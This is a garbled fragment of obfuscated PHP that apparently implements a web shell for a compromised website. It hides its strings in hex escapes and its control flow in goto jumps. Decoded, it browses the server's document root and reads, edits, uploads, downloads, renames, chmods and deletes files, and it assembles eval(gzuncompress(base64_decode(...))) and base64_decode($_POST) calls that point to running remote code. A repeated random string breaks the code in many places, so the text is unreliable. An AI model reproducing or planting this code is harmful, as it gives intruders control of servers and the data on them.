""\74\141\x20\x68\162\145\146\x3d\x22\x68\164\164\x70\x3a\x2f\x2f{$VdNWK}{$QqgvR}\x3f\x64\157\167\x6e\154\157\141\x64\x3d{$KHapq}\46\x64\151\x72\75{$tO3kQ}\42\x3e\x44\x3c\57\141\76"" . ""\x3c\57\164\x64\76\74\57\x74\162\x3e""; goto qQpil; qQpil: uY1eG: goto MIO_7; WHWgL: } goto YHTFb; AqiBo: $wKKLI = ""\142\141\163\x65\66\64\137\x64\x65\143\x6f\x64\x65\50\44\x5f\120\x4f\x53\124""; goto VRHt2; r8tk0: echo count($L2igI) . ""\x20\x66\x69\x6c\x65\x73\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ) { goto uy_rj; W23um: echo ""\143\141\x6e\47\164\40\160\145\x72\155\151\x73\163\151\x6f\x6e\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJgoto DtPzR; goto A2HcV; mDtHt: yiio4: goto Oi4aX; jJUO1: if (!chmod($ir2UM, 0775)) { goto xkVPJ; } goto J34KM; nxcLn: d7liB: goto jJUO1; jFtfL: $c7cHS = ''; goto mDtHt; YhmFC: $c7cHS = ''; goto ed0Du; kMeKS: JzQME: goto RBVAk; tKSnp: $c7cHS = fread($dWgkk, filesize($ir2UM)); goto IFhKo; ed0Du: DtPzR: goto DP9Ij; RBVAk: echo ""\x63\x61\x6e\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x6c\145\x3c\142\162\x3e""; goto jFtfL; J34KM: if (!($dWgkk = fopen($ir2UM, ""\x72\164""))) { goto JzQME; } goto t0mOt; S5Zsi: fclose($dWgkk); goto BEgTl; uy_rj: if (!(file_exists($ir2UM) and filesize($ir2UM) > 1)) { goto wmHM5; } goto cd3ZM; t0mOt: $c7cHS = fread($dWgkk, filesize($ir2UM)); goto S5Zsi; IFhKo: fclose($dWgkk); goto Mi9bM; BEgTl: goto yiio4; goto kMeKS; DP9Ij: qb2dt: goto rFv_R; A2HcV: xkVPJ: goto W23um; rFv_R: wmHM5: goto Wnbnz; Wnbnz: return $c7cHS; goto yHLf0; cd3ZM: if (!($dWgkk = fopen($ir2UM, ""\x72\164""))) { goto d7liB; } goto tKSnp; Mi9bM: goto qb2dt; goto nxcLn; yHLf0: } goto RG_ti; npNNZ: echo ""\x27\x22\54\40\x64\145\x6c\x61\171\51\x3b\15\xa\x9\x9\11\x3c\x2f\163\x63\x72\151\160\164\76\15\12\11\x9\x9""; goto mP7HR; dSG5z: goto z4_go; goto TlSR9; T0aee: taHdE: goto ZZkHo; KFvv0: if (!empty($_POST[""\x6e\x65\167\137\146\151\154\x65""])) { goto DZiIV; } goto J3Im2; ncknb: goto Q_ntA; goto SChOa; bg6ai: $w8S3s = ""\150\x74\x74\x70\72\57\x2f"" . $VdNWK . $QqgvR . ""\77\x64\151\x72\75"" . $_GET[""\x64\x69\162""] . ""\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ164\57\146\157\162\x6d\x2d\x64\141\x74\x61""; goto OSHo2; CpjCT: $g1bKy = array(); goto zqHQr; nEpF0: GNZed: goto L7_yf; vj5HR: fclose($Erk1y); goto DCXVe; J3Im2: if (!empty($_POST[""\x6e\145\x77\x5f\144\151\162""])) { goto Bl4wU; } goto yLFr0; lgqsY: VlPfp: goto a21ov; qo8s7: rzl0N: goto ppEC0; slSKO: function E9IFV($w8S3s) { goto KuLNc; uync7: echo ""\74\151\x6e\x70\x75\164\x20\156\141\x6d\x65\x3d\42\x6e\145\x77\x5f\144\x69\162\x22\40\163\x69\172\x65\75\x22\x37\x22\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x22\155\x61\153\145\x20\144\x69\162\x22\x20\57\76""; goto cG5Sw; we1PB: echo ""\74\x2f\x74\144\x3e\74\57\164\x72\76""; goto Ho7BD; ybL7q: echo ""\74\146\x6f\x72\x6d\x20\x61\x63\x74\x69\157\156\40\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ x6twC; cp40H: echo ""\74\146\157\x72\155\x20\x61\x63\x74\x69\x6f\x6e\x20\x3d\x20\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ; cG5Sw: echo ""\74\151\x6e\x70\x75\x74\40\164\171\x70\x65\x3d\42\163\x75\142\x6d\x69\164\x22\x20\166\141\x6c\x75\x65\x3d\x22\157\153\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\141\x6d\145\75\x22\x73\145\141\x72\x63\150\137\x66\151\154\x65\x22\x20\163\x69\x7a\x65\x3d\42\x37\42\x20\164\171\160\x65\x3d\x22\x74\x65\170\x74\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\42\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ165\x62\155\151\164\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ; eugKO: echo ""\x3c\151\x6e\160\x75\164\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx20\57\76\x3c\x2f\x66\x6f\162\x6d\76""; goto cp40H; b8NnQ: echo ""\74\146\x6f\162\155\x20\x61\x63\x74\151\157\x6e\x20\75\x20\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ; KuLNc: echo ""\74\x74\144\x20\141\154\x69\147\156\x3d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ: echo ""\x3c\151\156\x70\165\x74\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\40\164\171\160\x65\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x66\x69\154\145\42\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ_GET[""\x66\151\x6e\x64\x65\162""])) { goto Gnbma; } goto abb0P; hdrIJ: $qag9p = $_SERVER[""\x44\x4f\x43\125\115\x45\x4e\124\137\122\117\x4f\x54""]; goto xvBu9; xQ_k4: y1_MN: goto TiO86; rebiA: $B55HZ = $_SERVER[""\x44\117\103\125\x4d\x45\x4e\124\137\122\x4f\117\124""] . ""\x2f\x67\x6f\x6f\x64\146\151\x6e\144\x65\162\144\141\x74\x61\x2e\164\x78\x74""; goto uhd1R; dURPl: goto N_peK; goto GdZMk; f_RKQ: Smp1r: goto nV3l6; pe2Nf: echo ""\x3c\x74\144\76\x3c\x68\x72\76\74\x68\x72\x3e""; goto KG1Xz; uMnGt: $w8S3s = ""\x68\164\x74\x70\x3a\57\x2f"" . $VdNWK . $QqgvR . ""\77\x64\151\162\x3d"" . $_GET[""\x64\x69\162""]; goto dSG5z; VuLhu: foreach ($bmi_c as $v3hoM) { goto Fnl3Y; WEj08: if (file_exists($v3hoM)) { goto VEClA; } goto GATrh; mKFeG: ZmGTr: goto npitZ; DSLAW: if (!file_exists($v3hoM)) { goto UHAi_; } goto gryuc; tZ_Pw: goto bumW0; goto o2nDJ; EFJo6: goto ZmGTr; goto Wu3fx; ydh9X: $iRWW0 = str_replace($_SERVER[""\x44\117\103\125\115\x45\116\x54\137\x52\117\x4f\x54""], $_SERVER[""\123\105\x52\126\105\x52\x5f\x4e\101\x4d\x45""], $v3hoM); goto WEj08; npitZ: vr2ZJ: goto j1EI0; eWwYQ: $v3hoM = $_SERVER[""\x44\117\103\125\x4d\x45\x4e\124\137\122\x4f\x4f\x54""] . ""\x2f"" . $v3hoM; goto ydh9X; Fnl3Y: $v3hoM = strstr($v3hoM, ""\x2f""); goto eWwYQ; Oo99q: bumW0: goto mKFeG; o2nDJ: UHAi_: goto Ur5oC; gryuc: echo $iRWW0 . ""\x20\x2d\x20\156\x6f\x74\40\x72\145\155\x6f\166\145\x64"" . ""\12""; goto tZ_Pw; Wu3fx: VEClA: goto vr2j1; GATrh: echo $iRWW0 . ""\x20\55\x20\156\157\164\x20\146\157\x75\156\x64"" . ""\12""; goto EFJo6; vr2j1: pawK5($v3hoM); goto DSLAW; Ur5oC: echo $iRWW0 . ""\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx9\x9\11\15\xa\11\x9\x9\15\12\x9\11\74\57\x74\144\x3e\15\12\11""; goto JAFmq; hSlgZ: $w8S3s = ""\x68\164\164\x70\x3a\x2f\x2f"" . $VdNWK . $QqgvR . ""\77\144\151\162\75"" . $_GET[""\x64\x69\x72""] . ""\x26\x65\x64\x69\164\x3d"" . $P3pJd; goto ouA0y; QWsJM: $ncBPG = $_POST[""\163\145\x61\162\143\150\x5f\146\x69\x6c\x65""]; goto VZF1A; bfuol: goto mmJe3; goto MZxU4; yjdPC: Q_eXw: goto yvXoQ; TlSR9: ppHKR: goto vy7Dk; xmi1W: $qag9p = $_SERVER[""\104\x4f\x43\125\x4d\105\x4e\x54\137\x52\x4f\x4f\124""] . ""\57"" . $_POST[""\x6e\145\x77\x5f\144\151\x72""]; goto B5p40; sIg89: goto mP2FX; goto Cpg_F; ILcQM: a1tn8: goto C6isP; Ga3AN: if (isset($_POST[""\x6e\x65\x77\x5f\146\151\x6c\x65\137\156\x61\155\145""])) { goto ppHKR; } goto uMnGt; XgyOQ: readfile($_GET[""\144\x6f\x77\x6e\154\157\141\x64""]); goto hiFYY; Obdrk: foreach ($eb51o as $v3hoM) { goto zWwyA; qMp2m: $uQts7 = str_replace($_SERVER[""\104\117\x43\x55\x4d\x45\116\124\137\x52\117\117\x54""], $_SERVER[""\123\105\122\x56\x45\x52\137\x4e\101\x4d\105""], $v3hoM); goto N0oiN; zWwyA: if (!($v3hoM !== null and $v3hoM !== '' and $v3hoM !== ""\40"")) { goto XzG0B; } goto POWuw; h_xN0: ly4UQ: goto zvyJN; KFsXS: XzG0B: goto nzWxx; zvyJN: $Npkhx = AC9Dk($v3hoM); goto qMp2m; N0oiN: echo ""\x3c\164\162\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ42\x63\x65\x6e\164\145\162\x22\x3e\74\164\144\x20\x61\x6c\x69\147\156\x3d\x22\154\145\146\164\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ141\x74\x69\157\156\72\x20\156\157\156\145\x3b\42\40\150\x72\145\x66\x3d\42\x68\164\x74\160\72\x2f\57{$VdNWK}{$QqgvR}\77\x65\x64\151\x74\75{$v3hoM}\x26\x64\x69\162\x3d{$tO3kQ}\x22\76\x3c\x66\x6f\156\x74\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ\x2f\141\76"" . ""\74\57\164\x64\x3e\74\164\x64\76"" . BuCNk($v3hoM) . ""\x3c\57\x74\144\x3e\x3c\x74\144\x3e{$Npkhx}\74\x2f\x74\x64\x3e\74\x74\144\76"" . Gm9cQ($v3hoM, ""\x30"") . ""\74\57\164\x64\76\x3c\x74\144\x3e"" . ""\74\x61\40\x68\162\x65\146\x3d\42\x68\164\x74\160\72\57\57{$VdNWK}{$QqgvR}\77\x64\145\154\x3d{$v3hoM}\x26\x64\151\x72\75{$tO3kQ}\x22\76\x55\x3c\57\x61\x3e\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ}{$QqgvR}\x3f\145\x64\151\x74\x3d{$v3hoM}\x26\x64\151\162\75{$tO3kQ}\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJx5f\142\154\x61\156\x6b\42\40\150\162\145\x66\x3d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ141\x20\x68\x72\145\x66\x3d\x22\x68\x74\x74\x70\72\57\57{$VdNWK}{$QqgvR}\77\144\x6f\167\x6e\x6c\x6f\141\x64\75{$v3hoM}\46\x64\151\162\x3d{$tO3kQ}\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ ly4UQ; goto mdAyw; nzWxx: kqwYv: goto aliL1; POWuw: if (isset($_GET[""\x64\x69\162""])) { goto dDtpp; } goto kJduB; JHAlj: $tO3kQ = $_GET[""\144\151\162""]; goto h_xN0; mdAyw: dDtpp: goto JHAlj; kJduB: $tO3kQ = $_SERVER[""\104\117\103\x55\x4d\x45\116\124\x5f\x52\117\117\x54""]; goto p_F46; aliL1: } goto yjdPC; k1N6X: if (!isset($_GET[""\145\x64\151\x74""])) { goto VlPfp; } goto o5mWg; AaM6l: function GM9cQ($VjOK1, $h_0S7) { goto M248i; zFjIv: $OrrU2 = ""\x67\162\x65\x79""; goto tIysQ; aQ_Zf: goto Vf21G; goto XX9hY; FgoFQ: return $HEbbe; goto q1u8O; WP3i2: if ($HEbbe == ""\x34\64\x34"") { goto GHjDU; } goto B4gnh; iwJfE: jFd4L: goto FSujR; EG5X2: if ($h_0S7 == 1) { goto ps1e1; } goto rJdmz; XhrD8: EyB12: goto E2Ny0; Zf6Qc: if ($HEbbe == ""\x36\x34\64"") { goto Slvnx; } goto lCu3J; wHNyY: goto E6K4H; goto UhfgS; pjl7_: $OrrU2 = ""\147\162\145\x65\156""; goto Imach; GlWus: if ($HEbbe == ""\67\x34\64"") { goto kORyP; } goto i2DM1; tIysQ: goto Vf21G; goto hzEe5; Q0suT: yCGxf: goto MImub; NSkjb: goto Vf21G; goto iwJfE; ZLlwX: goto Vf21G; goto Q0suT; l1096: $OrrU2 = ""\157\x72\x61\x6e\147\x65""; goto ZLlwX; M248i: $HEbbe = substr(decoct(fileperms($VjOK1)), -3); goto Zf6Qc; lCu3J: if ($HEbbe == ""\67\65\65"") { goto EyB12; } goto WP3i2; uFQ2s: goto Vf21G; goto EAYEl; q1u8O: E6K4H: goto IMF02; hzEe5: Slvnx: goto pjl7_; rJdmz: return ""\74\x66\x6f\156\x74\40\x63\157\x6c\157\162\75{$OrrU2}\76"" . $HEbbe . ""\x3c\x2f\x66\x6f\x6e\x74\76""; goto wHNyY; FSujR: $OrrU2 = ""\162\145\x64""; goto uFQ2s; UhfgS: ps1e1: goto FgoFQ; gkbyP: $OrrU2 = ""\x62\162\157\x77\156""; goto NSkjb; Imach: goto Vf21G; goto XhrD8; MImub: $OrrU2 = ""\147\162\145\x65\x6e""; goto Sz12x; B4gnh: if ($HEbbe == ""\60\60\60"") { goto jFd4L; } goto GlWus; Sz12x: Vf21G: goto EG5X2; XX9hY: GHjDU: goto gkbyP; EAYEl: kORyP: goto l1096; E2Ny0: $OrrU2 = ""\43\x32\x45\x43\70\64\62""; goto aQ_Zf; i2DM1: if ($HEbbe == ""\66\66\x34"") { goto yCGxf; } goto zFjIv; IMF02: } goto ZzU_v; o5qhH: dss35: goto t1B4c; nV3l6: if (empty($_POST[""\156\145\167\x5f\x66\x69\154\145""]) and empty($_POST[""\x73\x65\x61\x72\x63\150\x5f\x66\151\x6c\x65""]) and empty($_POST[""\156\145\x77\137\x64\x69\x72""])) { goto kXsok; } goto KFvv0; TKRWF: EzSWH: goto XLxnO; fLVNY: echo ""\74\x3c\151\x6e\146\157\x3e\76""; goto VuLhu; ba3qP: $Ay1ZD = $QB964 - $LztR2 - 1; goto N14Yf; o5mWg: $MVQ4B = $VdNWK . $QqgvR; goto eLvFC; Eo0Zl: e0oPQ: goto OrRxQ; zsQS9: $xvhqj[] = trim($L2igI[$n7IRr]); goto aTkN9; mfteG: PAwk5($_GET[""\x64\145\x6c""]); goto bfuol; ngPvI: b52zt: goto bH693; ENf9L: if (is_dir($_GET[""\x64\x65\154""])) { goto n6I2I; } goto mfteG; fYIRe: $cjZuP = $qag9p; goto r6hmG; yvXoQ: if (!file_exists($aPaH9)) { goto yRZid; } goto dOPqd; Ks4Ng: echo ""\74\74\x2f\x69\x6e\146\x6f\x3e\76""; goto NrlhS; lW5kn: move_uploaded_file($_FILES[""\151\x6e\x70\x75\164\146\x69\x6c\x65""][""\164\155\160\137\156\141\155\145""], $uKa5l); goto gGcyK; sSV8k: $rwHC9 = str_replace($_SERVER[""\x44\117\103\x55\x4d\x45\x4e\124\x5f\x52\117\117\124""], $_SERVER[""\x53\x45\122\126\105\122\x5f\116\x41\x4d\105""], $_SERVER[""\x53\103\x52\x49\120\x54\137\106\111\x4c\x45\116\x41\x4d\x45""]); goto oOHbG; M5Adj: echo ""\11\x3c\164\162\x20\x61\154\151\147\156\75\x22\x6c\145\146\164\x22\76\xd\12\11\11\74\164\x64\x20\143\157\x6c\163\x70\141\x6e\75\x22\63\42\76\xd\12\11\11""; goto JMCir; UHeCH: if (rename($_GET[""\162\x65\x6e\x61\x6d\x65""], $_POST[""\156\137\156\x61\155\145""])) { goto A6_FD; } goto R_nez; is2iM: $rEKcz = ""\145\x76\141\x6c\50\x67\172\x75\x6e\x63\x6f\x6d\160\x72\x65\163\163\50\x62\141\163\145\x36\64\137\x64\x65\x63\157\144\145\50""; goto NOtMC; iLTrl: if (!isset($_GET[""\x64\151\163\160\141\164\x63\x68""])) { goto g41tH; } goto ob3V3; ax0TJ: if (count($L2igI) > 0) { goto gzpBn; } goto opc3v; WbrEw: $qag9p = $_SERVER[""\x44\x4f\103\x55\x4d\x45\x4e\124\137\x52\117\x4f\124""]; goto beqet; nRUHt: echo ""\x3c\x66\x6f\x6e\x74\40\143\157\x6c\x6f\162\x3d\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ74\x2f\x62\76\74\x2f\x66\x6f\156\x74\x3e""; goto qo8s7; c9gbq: E9IfV($w8S3s); goto wKVee; xVvfW: $qag9p = $_GET[""\144\x69\162""]; goto y9qYU; fT2wM: function a16XM($Ia7Nm) { goto fdhuM; nDVJe: if (!($FYqvS != ""\x2e"" && $FYqvS != ""\x2e\56"")) { goto uh_3a; } goto IU1w0; U7sJb: closedir($stVxA); goto AUkFu; q9nPb: A16xm($Ia7Nm . ""\57"" . $FYqvS); goto NpM31; xNnQA: uh_3a: goto m1Ner; KCM8a: v2DrC: goto U7sJb; AjQlK: a69PW: goto V_emE; NpM31: W85g_: goto xNnQA; J6vdQ: unlink($Ia7Nm . ""\x2f"" . $FYqvS); goto TOi_y; pkDpc: at0is: goto q9nPb; IU1w0: if (is_dir($Ia7Nm . ""\57"" . $FYqvS)) { goto at0is; } goto J6vdQ; AUkFu: rmdir($Ia7Nm); goto sVUp0; m1Ner: goto a69PW; goto KCM8a; fdhuM: $stVxA = opendir($Ia7Nm); goto AjQlK; TOi_y: goto W85g_; goto pkDpc; V_emE: if (!(($FYqvS = readdir($stVxA)) !== false)) { goto v2DrC; } goto nDVJe; sVUp0: } goto A_wGY; twpV_: MVC0W($_GET[""\165\x6e\172\x69\160""]); goto DwTlW; nS2xr: $zBJe0 = ""\x41\162\x72\x61\171\50\142\x61\163\145\x36\x34\x5f\144\x65\x63\x6f\144\x65\50""; goto rK4mL; CDuMW: header(""\x43\157\x6e\164\145\x6e\x74\x2d\x54\171\x70\145\72\40\x61\160\x70\x6c\x69\143\141\164\151\157\x6e\x2f\x6f\x63\x74\145\x74\55\x73\x74\x72\145\x61\155""); goto y4Mz2; QEeGq: header(""\103\x6f\156\164\145\156\164\55\124\162\x61\x6e\163\x66\x65\x72\x2d\x45\156\143\x6f\x64\x69\x6e\147\x3a\x20\142\151\x6e\141\x72\171""); goto R6BuH; tkDiO: J19Ff: goto QWsJM; AMoB2: if (!file_exists($B55HZ)) { goto BCM4T; } goto FpC9Y; wxNf4: QGBmt: goto X6v5P; MNBNS: header(""\x50\162\141\x67\x6d\x61\x3a\40\160\165\142\154\151\143""); goto QlMPR; cZ3fB: goto E7m1U; goto q2S4r; ZBNKM: echo $rwHC9; goto npNNZ; SBuQq: goto FZDRH; goto McX5H; q2G1V: E9ifV($w8S3s); goto qXIA4; BApvr: if (isset($_GET[""\144\151\162""])) { goto eMo3f; } goto hdrIJ; fNidh: XSzMn: goto UbR8h; roUBW: $Tv4ro = array(); goto fYIRe; Cpg_F: kXsok: goto BApvr; HdZXC: echo ""\11\xd\xa\11\11\11\x3c\163\x63\162\x69\160\164\40\154\141\x6e\x67\x75\x61\x67\145\x20\x3d\x20\47\152\x61\166\141\x73\143\162\x69\160\164\x27\x3e\15\12\x9\x9\11\166\141\x72\x20\x64\x65\x6c\141\171\40\75\x20\63\60\60\x3b\15\12\x9\11\x9\163\145\164\124\x69\x6d\145\157\165\164\x28\42\144\157\143\165\x6d\145\156\164\56\154\x6f\143\x61\x74\151\157\156\x2e\150\x72\145\146\x3d\x27""; goto ZBNKM; mIW1X: if (isset($_GET[""\x64\x69\x72""])) { goto ljsRq; } goto ync6F; OMGvS: iPzqW: goto jM6K5; szHu9: echo ""\11\11\11\x3c\146\157\162\155\x20\x6d\x65\x74\150\x6f\x64\75\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ162\x65\x6e\x61\x6d\x65""])) { goto EzSWH; } goto uVZuN; S1Dbo: $VdNWK = $_SERVER[""\123\105\x52\126\x45\122\x5f\x4e\x41\x4d\105""]; goto uk_0I; X6v5P: echo ""\x3c\141\x20\x68\162\145\146\75\x22\150\164\x74\x70\72\x2f\x2f"" . $VdNWK . $QqgvR . ""\x3f\x64\x69\x72\x3d"" . $Tv4ro[""{$Ay1ZD}""] . ""\x22\76"" . $BwPeK[""{$LztR2}""] . ""\74\x2f\141\x3e\x2f""; goto OMGvS; qIWmC: function PAwK5($dWgkk) { goto qm15f; O1Fxl: uBlsF: goto hRTcs; eMZWL: dXRh0: goto yYlfC; yYlfC: goto uBlsF; goto YEwQL; TqOj3: mOnfe: goto RmnTr; ERumD: LFA6P: goto O1t_Q; sWlYa: goto dXRh0; goto t6KVR; mAjg2: goto y1WMN; goto ERumD; jrZTB: return ""\x6f\x6b\41""; goto sWlYa; qm15f: if (!file_exists($dWgkk)) { goto IL00H; } goto xurZ8; Zkb4e: return ""\x6e\157\x20\150\141\x76\145\40\160\x65\162\x6d\151\x73\163\151\x6f\156\x20\146\x6f\x72\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ40\156\157\x74\x20\144\x65\x6c\x65\164\145\41""; goto eMZWL; VPOL1: goto mOnfe; goto XuvoJ; YEwQL: Ims9u: goto Zkb4e; ILBi7: return ""\x66\151\x6c\x65\x20\x6e\x6f\164\x20\145\x78\151\x73\x74\x73""; goto TqOj3; XuvoJ: IL00H: goto ILBi7; A62VJ: if (!unlink($dWgkk)) { goto ZxLve; } goto jrZTB; a4C5s: return ""\x6f\x6b\x21""; goto mAjg2; t6KVR: ZxLve: goto qzflY; xurZ8: if (!unlink($dWgkk)) { goto LFA6P; } goto a4C5s; O1t_Q: if (!chmod($dWgkk, 0755)) { goto Ims9u; } goto A62VJ; RmnTr: } goto iLTrl; vEpc6: if (!isset($_GET[""\144\157\x77\156\x6c\x6f\x61\x64""])) { goto ovtL3; } goto iNSi3; xvBu9: goto gplZx; goto Z0ioE; K61Rm: $aPaH9 = $_SERVER[""\x44\117\x43\x55\115\x45\116\124\137\122\117\x4f\x54""] . ""\x2f\x66\x69\156\x64\145\162\144\141\164\x61\56\x74\170\164""; goto rebiA; NrlhS: exit; goto tJf3L; Xf03w: function uxuGj($ir2UM) { goto k3lVQ; vi7Ah: $dWgkk = fopen($AjexP, ""\x72\x74""); goto APOG5; pcQHL: if (file_exists($ir2UM) and filesize($ir2UM) > 1) { goto zwFxr; } goto h8tGp; h8tGp: $IoOhN = array(); goto Sm9A2; k0_yh: goto jGURv; goto CqpDh; k3lVQ: $AjexP = $ir2UM; goto pcQHL; UP1Ji: fclose($dWgkk); goto roldn; roldn: return $IoOhN; goto rck1Q; Sm9A2: return $IoOhN; goto k0_yh; CqpDh: zwFxr: goto vi7Ah; APOG5: $IoOhN = explode(""\12"", fread($dWgkk, filesize($AjexP))); goto UP1Ji; rck1Q: jGURv: goto mqLPO; mqLPO: } goto fT2wM; R6BuH: header(""\x45\170\160\151\x72\x65\x73\x3a\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ; goto D5faf; rdDfl: $qag9p = $_GET[""\x64\x69\162""] . ""\57"" . $_POST[""\156\145\167\137\144\x69\162""]; goto pTDZJ; WAzUP: goto MahxP; goto CyDjU; WKo2f: if (!($LztR2 <= $QB964)) { goto florf; } goto ba3qP; OSHo2: if (!file_exists($aPaH9)) { goto QHihQ; } goto Q3Q8j; p4GPE: $fbXkE = ""\74\146\x6f\x6e\x74\x20\x63\157\x6c\157\x72\75\x22\147\162\145\x65\156\x22\76\74\142\76\x4e\141\155\x65\40\x63\x68\141\156\147\145\x64\x21\x3c\x2f\x62\76\74\x2f\x66\x6f\156\164\x3e""; goto YEiIr; yLFr0: if (!empty($_POST[""\x73\x65\x61\x72\x63\150\137\146\151\154\145""])) { goto J19Ff; } goto sIg89; hzjoI: goto MeHGB; goto nEpF0; ok3Ws: kIwM_: goto G18c9; LO9Y4: N_peK: goto szHu9; ZpcIm: echo ""\x9\x9\x9\x3c\142\162\x3e\74\142\x72\76\15\xa\11\x9\x9\x44\x69\x72\x65\143\164\157\x72\171\72\40\15\12\11\11\x9""; goto RTPOT; nfUOK: mEvmp: goto K22kB; Ej8QL: goto iPzqW; goto wxNf4; scMem: echo ""\x3c\x66\157\156\x74\40\x63\x6f\x6c\x6f\x72\75\42\x72\x65\x64\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ d5a9U; cNalV: $zshba = ""\x69\163\x5f\x75\160\154\157\x61\144\x65\144\137\x66\151\x6c\x65""; goto AqiBo; qXIA4: E1odq: goto vj5HR; Xyl4I: g41tH: goto IHGon; tjGNA: echo ""\x3c\x61\x20\150\162\x65\146\x3d\42\x68\x74\164\160\72\x2f\x2f"" . $VdNWK . $QqgvR . ""\77\144\151\162\x3d"" . $qag9p . ""\49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJgoto kI8NA; } goto TzRgx; bMo_L: $w8S3s = ""\x68\164\x74\x70\x3a\x2f\x2f"" . $VdNWK . $QqgvR . ""\x3f\144\x69\162\x3d"" . $_GET[""\x64\151\162""] . ""\46\x65\x64\151\x74\75"" . $qag9p; goto HvNO6; CyDjU: qQEth: goto YVJT8; hu3Xe: $xvhqj = array(); goto QaWTu; gGcyK: $JH7So = str_replace($_SERVER[""\x44\x4f\x43\x55\x4d\x45\116\x54\137\122\x4f\117\x54""], $_SERVER[""\x53\105\122\x56\x45\x52\x5f\116\x41\x4d\105""], $uKa5l); goto evmxc; XLxnO: function y1Fl9($dWgkk, $MVQ4B) { goto usYiW; c0Mmo: if (!empty($_POST[""\x6e\145\x77\137\162\x65\x6d\x6f\164\x65""])) { goto be48y; } goto fEdbK; TmnaC: $YvMra = 